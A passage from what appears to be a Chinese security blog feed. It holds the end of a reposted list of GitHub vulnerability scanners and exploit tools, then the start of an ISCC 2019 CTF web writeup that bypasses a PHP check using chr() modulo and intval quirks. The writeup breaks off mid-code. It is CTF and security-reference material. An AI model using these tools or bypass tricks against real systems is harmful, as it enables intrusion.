(基于Nikto扫描规则的被动式路径扫描以及信息爬虫）</li><li><a href="https://github.com/zerokeeper/WebEye" target="_blank" rel="noopener">https://github.com/zerokeeper/WebEye</a> (快速识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架)</li><li><a href="https://github.com/m3liot/shcheck" target="_blank" rel="noopener">https://github.com/m3liot/shcheck</a> (用于检查web服务的http header的安全性)</li><li><a href="https://github.com/aipengjie/sensitivefilescan" target="_blank" rel="noopener">https://github.com/aipengjie/sensitivefilescan</a> (一款高效快捷的敏感文件扫描工具）</li><li><a href="https://github.com/fnk0c/cangibrina" target="_blank" rel="noopener">https://github.com/fnk0c/cangibrina</a> (通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器）</li><li><a href="https://github.com/n4xh4ck5/CMSsc4n" target="_blank" rel="noopener">https://github.com/n4xh4ck5/CMSsc4n</a> (常规CMS指纹识别）</li><li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a> （WAF指纹识别及自动化bypass工具）</li><li><a href="https://github.com/dzonerzy/goWAPT" target="_blank" rel="noopener">https://github.com/dzonerzy/goWAPT</a> (Web应用fuzz工具、框架，同时可用于web路径/服务扫描)</li><li><a href="https://github.com/blackye/webdirdig" target="_blank" rel="noopener">https://github.com/blackye/webdirdig</a> (web敏感目录/信息泄漏扫描脚本)</li><li><a href="https://github.com/GitHackTools/BillCipher" target="_blank" rel="noopener">https://github.com/GitHackTools/BillCipher</a> (用于网站或IP地址的信息收集工具)</li><li><a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">https://github.com/boy-hack/w8fuckcdn</a> (通过扫描全网获得真实IP的自动化程序)</li><li><a href="https://github.com/boy-hack/w11scan" target="_blank" rel="noopener">https://github.com/boy-hack/w11scan</a> (分布式WEB指纹识别平台)</li><li><a href="https://github.com/Nekmo/dirhunt" target="_blank" rel="noopener">https://github.com/Nekmo/dirhunt</a> (爬虫式web目录扫描工具)</li><li><a href="https://github.com/MetaChar/pyHAWK" target="_blank" rel="noopener">https://github.com/MetaChar/pyHAWK</a> (数据库文件、私钥等敏感文件泄露扫描)</li></ul><h4 id="专用（即特定性针对某些组件）扫描器"><a href="#专用（即特定性针对某些组件）扫描器" class="headerlink" title="专用（即特定性针对某些组件）扫描器"></a>专用（即特定性针对某些组件）扫描器</h4><ul><li><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> (Jenkins漏洞探测、用户抓取爆破)</li><li><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a> (首款集成化的Discuz扫描工具)</li><li><a href="https://github.com/chuhades/CMS-Exploit-Framework" target="_blank" rel="noopener">https://github.com/chuhades/CMS-Exploit-Framework</a> (一款简洁优雅的CMS扫描利用框架)</li><li><a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a> （IIS短文件名暴力枚举漏洞利用工具)</li><li><a href="https://github.com/riusksk/FlashScanner" target="_blank" rel="noopener">https://github.com/riusksk/FlashScanner</a> (flashxss扫描)</li><li><a href="https://github.com/coffeehb/SSTIF" target="_blank" rel="noopener">https://github.com/coffeehb/SSTIF</a> （一个Fuzzing服务器端模板注入漏洞的半自动化工具）</li><li><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a> (服务器端模板注入漏洞检测与利用工具)</li><li><a href="https://github.com/cr0hn/dockerscan" target="_blank" rel="noopener">https://github.com/cr0hn/dockerscan</a> (Docker扫描工具)</li><li><a href="https://github.com/m4ll0k/WPSeku" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSeku</a> (一款精简的wordpress扫描工具)</li><li><a href="https://github.com/rastating/wordpress-exploit-framework" target="_blank" rel="noopener">https://github.com/rastating/wordpress-exploit-framework</a> (集成化wordpress漏洞利用框架)</li><li><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a> (用于扫描J2EE应用的一款burpsuite插件)</li><li><a href="https://github.com/riusksk/StrutScan" target="_blank" rel="noopener">https://github.com/riusksk/StrutScan</a> (一款基于perl的strut2的历史漏洞扫描器)</li><li><a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">https://github.com/D35m0nd142/LFISuite</a> (本地文件包含漏洞利用及扫描工具，支持反弹shell)</li><li><a href="https://github.com/0x4D31/salt-scanner" target="_blank" rel="noopener">https://github.com/0x4D31/salt-scanner</a> (基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA、slack平台结合使用)</li><li><a href="https://github.com/tijme/angularjs-csti-scanner" target="_blank" rel="noopener">https://github.com/tijme/angularjs-csti-scanner</a> (自动化探测客户端AngularJS模板注入漏洞工具)</li><li><a href="https://github.com/irsdl/IIS-ShortName-Scanner" target="_blank" rel="noopener">https://github.com/irsdl/IIS-ShortName-Scanner</a> (Java编写的IIS短文件名暴力枚举漏洞利用工具)</li><li><a href="https://github.com/swisskyrepo/Wordpresscan" target="_blank" rel="noopener">https://github.com/swisskyrepo/Wordpresscan</a> (基于WPScan以及WPSeku的优化版wordpress扫描器)</li><li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="noopener">https://github.com/CHYbeta/cmsPoc</a> (CMS渗透测试框架）</li><li><a href="https://github.com/rudSarkar/crlf-injector" target="_blank" rel="noopener">https://github.com/rudSarkar/crlf-injector</a> (CRLF注入漏洞批量扫描）</li><li><a href="https://github.com/3gstudent/Smbtouch-Scanner" target="_blank" rel="noopener">https://github.com/3gstudent/Smbtouch-Scanner</a> (自动化扫描内网中存在的由shadow brokers泄露的ETERNAL系列漏洞)</li><li><a href="https://github.com/utiso/dorkbot" target="_blank" rel="noopener">https://github.com/utiso/dorkbot</a> （通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描）</li><li><a href="https://github.com/OsandaMalith/LFiFreak" target="_blank" rel="noopener">https://github.com/OsandaMalith/LFiFreak</a> （本地文件包含漏洞利用及扫描工具，支持反弹shell)</li><li><a href="https://github.com/mak-/parameth" target="_blank" rel="noopener">https://github.com/mak-/parameth</a> (用于枚举脚本的GET/POST未知参数字段）</li><li><a href="https://github.com/Lucifer1993/struts-scan" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan</a> (struts2漏洞全版本检测和利用工具)</li><li><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">https://github.com/hahwul/a2sv</a> (SSL漏洞扫描，例如心脏滴血漏洞等）</li><li><a href="https://github.com/NullArray/DorkNet" target="_blank" rel="noopener">https://github.com/NullArray/DorkNet</a> (基于搜索引擎的漏洞网页搜寻）</li><li><a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">https://github.com/NickstaDB/BaRMIe</a> (用于攻击爆破Java Remote Method Invocation服务的工具)</li><li><a href="https://github.com/RetireJS/grunt-retire" target="_blank" rel="noopener">https://github.com/RetireJS/grunt-retire</a> (扫描js扩展库的常见漏洞）</li><li><a href="https://github.com/kotobukki/BDA" target="_blank" rel="noopener">https://github.com/kotobukki/BDA</a> (针对hadoop/spark等大数据平台的的漏洞探测工具）</li><li><a href="https://github.com/jagracey/Regex-DoS" target="_blank" rel="noopener">https://github.com/jagracey/Regex-DoS</a> (RegEx 拒绝服务扫描器)</li><li><a href="https://github.com/milesrichardson/docker-onion-nmap" target="_blank" rel="noopener">https://github.com/milesrichardson/docker-onion-nmap</a> (使用nmap扫描Tor网络上隐藏的”onion”服务)</li><li><a href="https://github.com/Moham3dRiahi/XAttacker" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/XAttacker</a> (Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits)</li><li><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> (一个迷你的信息泄漏批量扫描脚本)</li><li><a href="https://github.com/almandin/fuxploider" target="_blank" rel="noopener">https://github.com/almandin/fuxploider</a> (文件上传漏洞扫描器及利用工具）</li><li><a href="https://github.com/Ice3man543/SubOver" target="_blank" rel="noopener">https://github.com/Ice3man543/SubOver</a> (子域名接管漏洞检测工具，支持30+云服务托管检测)</li><li><a href="https://github.com/Jamalc0m/wphunter" target="_blank" rel="noopener">https://github.com/Jamalc0m/wphunter</a> (Wordpress漏洞扫描器,同时也支持敏感文件泄露扫描)</li><li><a href="https://github.com/retirejs/retire.js" target="_blank" rel="noopener">https://github.com/retirejs/retire.js</a> (检测网站依赖的JavaScript库中存在的已知通用漏洞)</li><li><a href="https://github.com/3xp10it/xupload" target="_blank" rel="noopener">https://github.com/3xp10it/xupload</a> (自动检测上传功能是否可上传webshell)</li><li><a href="https://github.com/mobrine-mob/M0B-tool" target="_blank" rel="noopener">https://github.com/mobrine-mob/M0B-tool</a> （CMS指纹识别及自动化渗透测试框架）</li><li><a href="https://github.com/rezasp/vbscan" target="_blank" rel="noopener">https://github.com/rezasp/vbscan</a> (论坛框架vBulletin黑盒漏洞扫描器)</li><li><a href="https://github.com/MrSqar-Ye/BadMod" target="_blank" rel="noopener">https://github.com/MrSqar-Ye/BadMod</a> (CMS指纹识别及自动化渗透测试框架)</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMSeeK</a> (CMS漏洞检测和利用套件)</li><li><a href="https://github.com/cloudsploit/scans" target="_blank" rel="noopener">https://github.com/cloudsploit/scans</a> (AWS安全审计工具)</li><li><a href="https://github.com/radenvodka/SVScanner" target="_blank" rel="noopener">https://github.com/radenvodka/SVScanner</a> (针对wp、magento、joomla等CMS的漏洞扫描器及自动利用工具)</li><li><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">https://github.com/rezasp/joomscan</a> (OWASP旗下joomla漏洞扫描项目)</li><li><a href="https://github.com/6IX7ine/djangohunter" target="_blank" rel="noopener">https://github.com/6IX7ine/djangohunter</a> (用于检测因错误配置导致敏感信息暴露的Django应用程序)</li></ul><h4 id="无线网络（审计）扫描器"><a href="#无线网络（审计）扫描器" class="headerlink" title="无线网络（审计）扫描器"></a>无线网络（审计）扫描器</h4><ul><li><a href="https://github.com/savio-code/fern-wifi-cracker/" target="_blank" rel="noopener">https://github.com/savio-code/fern-wifi-cracker/</a> (无线安全审计工具)</li><li><a href="https://github.com/m4n3dw0lf/PytheM" target="_blank" rel="noopener">https://github.com/m4n3dw0lf/PytheM</a> （Python网络/渗透测试工具）</li><li><a href="https://github.com/P0cL4bs/WiFi-Pumpkin" target="_blank" rel="noopener">https://github.com/P0cL4bs/WiFi-Pumpkin</a> （无线安全渗透测试套件）</li><li><a href="https://github.com/MisterBianco/BoopSuite" target="_blank" rel="noopener">https://github.com/MisterBianco/BoopSuite</a> (无线网络审计工具，支持2-5GHZ频段）</li><li><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a> (ARP欺骗，无线网络劫持）</li><li><a href="https://github.com/besimaltnok/PiFinger" target="_blank" rel="noopener">https://github.com/besimaltnok/PiFinger</a> (检查wifi是否是”大菠萝”所开放的热点，并给予网络评分）</li><li><a href="https://github.com/derv82/wifite2" target="_blank" rel="noopener">https://github.com/derv82/wifite2</a> （自动化无线网络攻击工具wifite的重构版本）</li></ul><h4 id="局域网络（本地网络）扫描器"><a href="#局域网络（本地网络）扫描器" class="headerlink" title="局域网络（本地网络）扫描器"></a>局域网络（本地网络）扫描器</h4><ul><li><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a> (基于BBScan via.lijiejie的本地网络扫描)</li><li><a href="https://github.com/niloofarkheirkhah/nili" target="_blank" rel="noopener">https://github.com/niloofarkheirkhah/nili</a> （网络扫描，中间人攻击，协议检测与逆向）</li><li><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a> （基于javascript的本地网络扫描)</li></ul><h4 id="代码审计工具或扫描器"><a href="#代码审计工具或扫描器" class="headerlink" title="代码审计工具或扫描器"></a>代码审计工具或扫描器</h4><ul><li><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a> (白盒代码安全审计系统)</li><li><a href="https://github.com/OneSourceCat/phpvulhunter" target="_blank" rel="noopener">https://github.com/OneSourceCat/phpvulhunter</a> (静态PHP代码审计)</li><li><a href="https://github.com/Qihoo360/phptrace" target="_blank" rel="noopener">https://github.com/Qihoo360/phptrace</a> (跟踪、分析PHP运行情况的工具）</li><li><a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a> (NodeJS应用代码审计）</li><li><a href="https://github.com/shengqi158/pyvulhunter" target="_blank" rel="noopener">https://github.com/shengqi158/pyvulhunter</a> （Python应用审计）</li><li><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="noopener">https://github.com/presidentbeef/brakeman</a> ( Ruby on Rails应用静态代码分析）</li><li><a href="https://github.com/python-security/pyt" target="_blank" rel="noopener">https://github.com/python-security/pyt</a> (Python应用静态代码审计）</li><li><a href="https://github.com/m4ll0k/WPSploit" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSploit</a> (Wordpress插件代码安全审计）</li><li><a href="https://github.com/emanuil/php-reaper" target="_blank" rel="noopener">https://github.com/emanuil/php-reaper</a> (用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码）</li><li><a href="https://github.com/lowjoel/phortress" target="_blank" rel="noopener">https://github.com/lowjoel/phortress</a> (用于检测潜在安全漏洞的PHP静态代码分析工具）</li></ul><h4 id="模块化设计扫描器或漏洞检测框架"><a href="#模块化设计扫描器或漏洞检测框架" class="headerlink" title="模块化设计扫描器或漏洞检测框架"></a>模块化设计扫描器或漏洞检测框架</h4><ul><li><a href="https://github.com/az0ne/AZScanner" target="_blank" rel="noopener">https://github.com/az0ne/AZScanner</a> (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</li><li><a href="https://github.com/blackye/lalascan" target="_blank" rel="noopener">https://github.com/blackye/lalascan</a> (集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架)</li><li><a href="https://github.com/blackye/BkScanner" target="_blank" rel="noopener">https://github.com/blackye/BkScanner</a> (BkScanner 分布式、插件化web漏洞扫描器)</li><li><a href="https://github.com/ysrc/GourdScanV2" target="_blank" rel="noopener">https://github.com/ysrc/GourdScanV2</a> （ysrc出品的被动式漏洞扫描工具)</li><li><a href="https://github.com/netxfly/passive_scan" target="_blank" rel="noopener">https://github.com/netxfly/passive_scan</a> (基于http代理的web漏洞扫描器)</li><li><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">https://github.com/1N3/Sn1per</a> (自动化扫描器，包括中间件扫描以及设备指纹识别)</li><li><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner" target="_blank" rel="noopener">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> （定向全自动化渗透测试工具）</li><li><a href="https://github.com/3xp10it/3xp10it" target="_blank" rel="noopener">https://github.com/3xp10it/3xp10it</a> （自动化渗透测试框架，支持cdn真实ip查找、指纹识别等)</li><li><a href="https://github.com/Lcys/lcyscan" target="_blank" rel="noopener">https://github.com/Lcys/lcyscan</a> (python插件化漏洞扫描器，支持生成扫描报表）</li><li><a href="https://github.com/Xyntax/POC-T" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T</a> （渗透测试插件化并发框架）</li><li><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner" target="_blank" rel="noopener">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a> （支持检测SQLi/XSS/LFI/RFI等漏洞的扫描器）</li><li><a href="https://github.com/Skycrab/leakScan" target="_blank" rel="noopener">https://github.com/Skycrab/leakScan</a> （Web图形化的的漏洞扫描框架）</li><li><a href="https://github.com/zhangzhenfeng/AnyScan" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/AnyScan</a> (一款web化的自动化渗透测试框架)</li><li><a href="https://github.com/Tuhinshubhra/RED_HAWK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/RED_HAWK</a> (一款集成信息收集、漏洞扫描、指纹识别等的多合一扫描工具）</li><li><a href="https://github.com/Arachni/arachni" target="_blank" rel="noopener">https://github.com/Arachni/arachni</a> (高度集成化的Web应用漏洞扫描框架，支持REST、RPC等api调用）</li><li><a href="https://github.com/infobyte/faraday" target="_blank" rel="noopener">https://github.com/infobyte/faraday</a> （集成化渗透测试辅助平台及漏洞管理平台）</li><li><a href="https://github.com/juansacco/exploitpack" target="_blank" rel="noopener">https://github.com/juansacco/exploitpack</a> (渗透测试集成框架，包含超过38,000+ exploits)</li><li><a href="https://github.com/swisskyrepo/DamnWebScanner" target="_blank" rel="noopener">https://github.com/swisskyrepo/DamnWebScanner</a> （基于chrome/opera插件的被动式漏洞扫描）</li><li><a href="https://github.com/anilbaranyelken/tulpar" target="_blank" rel="noopener">https://github.com/anilbaranyelken/tulpar</a> (支持多种web漏洞扫描，命令行环境使用）</li><li><a href="https://github.com/m4ll0k/Spaghetti" target="_blank" rel="noopener">https://github.com/m4ll0k/Spaghetti</a> (web应用扫描器，支持指纹识别、文件目录爆破、SQL/XSS/RFI等漏洞扫描，也可直接用于struts、ShellShock等扫描)</li><li><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest" target="_blank" rel="noopener">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> (集成子域名枚举、nmap、waf指纹识别等模块的web应用扫描器）</li><li><a href="https://github.com/0xsauby/yasuo" target="_blank" rel="noopener">https://github.com/0xsauby/yasuo</a> (使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞）</li><li><a href="https://github.com/hatRiot/clusterd" target="_blank" rel="noopener">https://github.com/hatRiot/clusterd</a> (Web应用自动化扫描框架,支持自动化上传webshell)</li><li><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a> （一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC，可使用docker部署）</li><li><a href="https://github.com/TophantTechnology/osprey" target="_blank" rel="noopener">https://github.com/TophantTechnology/osprey</a> (斗象能力中心出品并长期维护的开源漏洞检测框架)</li><li><a href="https://github.com/yangbh/Hammer" target="_blank" rel="noopener">https://github.com/yangbh/Hammer</a> (Web应用漏洞扫描框架)</li><li><a href="https://github.com/Lucifer1993/AngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a> (Web应用漏洞扫描框架,基于python3)</li><li><a href="https://github.com/secrary/EllaScanner" target="_blank" rel="noopener">https://github.com/secrary/EllaScanner</a> (被动式漏洞扫描，支持历史cve编号漏洞识别)</li><li><a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="noopener">https://github.com/zaproxy/zaproxy</a> (The OWASP ZAP core project出品的综合性渗透测试工具）</li><li><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a> (Web服务综合型扫描器，用于指定目标的资产收集、安全配置缺陷或者安全漏洞扫描）</li><li><a href="https://github.com/s0md3v/Striker" target="_blank" rel="noopener">https://github.com/s0md3v/Striker</a> (一款多方位信息收集、指纹识别及漏洞扫描工具）</li><li><a href="https://github.com/dermotblair/webvulscan" target="_blank" rel="noopener">https://github.com/dermotblair/webvulscan</a> (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞，支持输出pdf报告)</li><li><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework" target="_blank" rel="noopener">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a> (渗透测试辅助工具，综合利用框架）</li><li><a href="https://github.com/toyakula/luna" target="_blank" rel="noopener">https://github.com/toyakula/luna</a> (基于被动式扫描框架的自动化web漏洞扫描工具）</li><li><a href="https://github.com/Manisso/fsociety" target="_blank" rel="noopener">https://github.com/Manisso/fsociety</a> (渗透测试辅助框架，包含信息搜集、无线渗透、web应用扫描等功能)</li><li><a href="https://github.com/boy-hack/w9scan" target="_blank" rel="noopener">https://github.com/boy-hack/w9scan</a> (内置1200+插件的web漏洞扫描框架)</li><li><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a> (Web服务安全评估工具,提供基于windows操作系统的简单.exe应用)</li><li><a href="https://github.com/AmyangXYZ/AssassinGo" target="_blank" rel="noopener">https://github.com/AmyangXYZ/AssassinGo</a> (使用Go开发的可扩展以及高并发渗透测试框架)</li><li><a href="https://github.com/jeffzh3ng/InsectsAwake" target="_blank" rel="noopener">https://github.com/jeffzh3ng/InsectsAwake</a> (基于 Flask 应用框架的漏洞扫描系统)</li><li><a href="https://github.com/m4ll0k/Galileo" target="_blank" rel="noopener">https://github.com/m4ll0k/Galileo</a> (一个操作上类似metasploit的web应用安全审计框架)</li><li><a href="https://github.com/joker25000/Optiva-Framework" target="_blank" rel="noopener">https://github.com/joker25000/Optiva-Framework</a> (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞)</li><li><a href="https://github.com/theInfectedDrake/TIDoS-Framework" target="_blank" rel="noopener">https://github.com/theInfectedDrake/TIDoS-Framework</a> (集成104个模块的Web应用程序渗透测试框架)</li><li><a href="https://github.com/TideSec/WDScanner" target="_blank" rel="noopener">https://github.com/TideSec/WDScanner</a> (一款功能完备的企业级漏洞扫描器)</li></ul><h4 id="高级持续性威胁-APT-相关工具"><a href="#高级持续性威胁-APT-相关工具" class="headerlink" title="高级持续性威胁(APT)相关工具"></a>高级持续性威胁(APT)相关工具</h4><ul><li><a href="https://github.com/Neo23x0/Loki" target="_blank" rel="noopener">https://github.com/Neo23x0/Loki</a> (一款APT入侵痕迹扫描器)</li></ul><h4 id="工控系统-amp-大型网络相关安全工具"><a href="#工控系统-amp-大型网络相关安全工具" class="headerlink" title="工控系统&amp;大型网络相关安全工具"></a>工控系统&amp;大型网络相关安全工具</h4><ul><li><a href="https://github.com/w3h/icsmaster/tree/master/nse" target="_blank" rel="noopener">https://github.com/w3h/icsmaster/tree/master/nse</a> （ICS设备nmap扫描脚本)</li><li><a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a> （SDN安全评估框架）</li></ul><br>**转自**：https://github.com/We5ter/Scanners-Box<br>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC 2019 Web Writeup</title>
      <link href="/2019/06/09/ISCC-2019-Web-Writeup/"/>
      <url>/2019/06/09/ISCC-2019-Web-Writeup/</url>
      
        <content type="html"><![CDATA[<p>只做了Web题…</p><a id="more"></a><h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p><strong>分析源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];<span class="comment">//value是一个数组</span></span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;<span class="comment">//count返回数组中元素的数目</span></span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) </span><br><span class="line">    <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    $username .= chr($value[$i]);<span class="comment">//chr() 函数从指定的 ASCII 值返回字符，并且加到username上</span></span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;<span class="comment">//intval — 获取变量的整数值</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>理清大概思路时候查看输出 flag 的先决条件是 <code>if ($username == &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)</code></p><ul><li><strong>判断 <code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code></strong> </li></ul><p>跟进 username，变化过程是从第六行的设置为空，到 <code>$username .= chr($value[$i]);</code> 这一步</p><p>value的值在 32到127 之间会被销毁,本想一次性把 w3lc0me_To_ISCC2019 传进去，貌似不行…只能一个一个传。</p><p>写一个小脚本，将其字符串切割。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">119</span> [<span class="number">1</span>] =&gt; <span class="number">51</span> [<span class="number">2</span>] =&gt; <span class="number">108</span> [<span class="number">3</span>] =&gt; <span class="number">99</span> [<span class="number">4</span>] =&gt; <span class="number">48</span> [<span class="number">5</span>] =&gt; <span class="number">109</span> [<span class="number">6</span>] =&gt; <span class="number">101</span> [<span class="number">7</span>] =&gt; <span class="number">95</span> [<span class="number">8</span>] =&gt; <span class="number">84</span> [<span class="number">9</span>] =&gt; <span class="number">111</span> [<span class="number">10</span>] =&gt; <span class="number">95</span> [<span class="number">11</span>] =&gt; <span class="number">73</span> [<span class="number">12</span>] =&gt; <span class="number">83</span> [<span class="number">13</span>] =&gt; <span class="number">67</span> [<span class="number">14</span>] =&gt; <span class="number">67</span> [<span class="number">15</span>] =&gt; <span class="number">50</span> [<span class="number">16</span>] =&gt; <span class="number">48</span> [<span class="number">17</span>] =&gt; <span class="number">49</span> )</span><br></pre></td></tr></table></figure><p>发现有不少的在32到127 之间，查看手册发现有这么一句话</p><blockquote><p>Note that if the number is higher than 256, it will return the number mod 256.<br> For example :<br> chr(321)=A because A=65(256)</p></blockquote><p>大概意思是 如果数字高于256，它将返回数字mod 256</p><p>那么改进一下脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">375</span> [<span class="number">1</span>] =&gt; <span class="number">307</span> [<span class="number">2</span>] =&gt; <span class="number">364</span> [<span class="number">3</span>] =&gt; <span class="number">355</span> [<span class="number">4</span>] =&gt; <span class="number">304</span> [<span class="number">5</span>] =&gt; <span class="number">365</span> [<span class="number">6</span>] =&gt; <span class="number">357</span> [<span class="number">7</span>] =&gt; <span class="number">351</span> [<span class="number">8</span>] =&gt; <span class="number">340</span> [<span class="number">9</span>] =&gt; <span class="number">367</span> [<span class="number">10</span>] =&gt; <span class="number">351</span> [<span class="number">11</span>] =&gt; <span class="number">329</span> [<span class="number">12</span>] =&gt; <span class="number">339</span> [<span class="number">13</span>] =&gt; <span class="number">323</span> [<span class="number">14</span>] =&gt; <span class="number">323</span> [<span class="number">15</span>] =&gt; <span class="number">306</span> [<span class="number">16</span>] =&gt; <span class="number">304</span> [<span class="number">17</span>] =&gt; <span class="number">305</span> )</span><br></pre></td></tr></table></figure><ul><li><strong>然后下一个条件是 <code>intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)</code></strong></li></ul><p>在 W3C 上有对其函数进行的测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'+42'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'-42'</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span 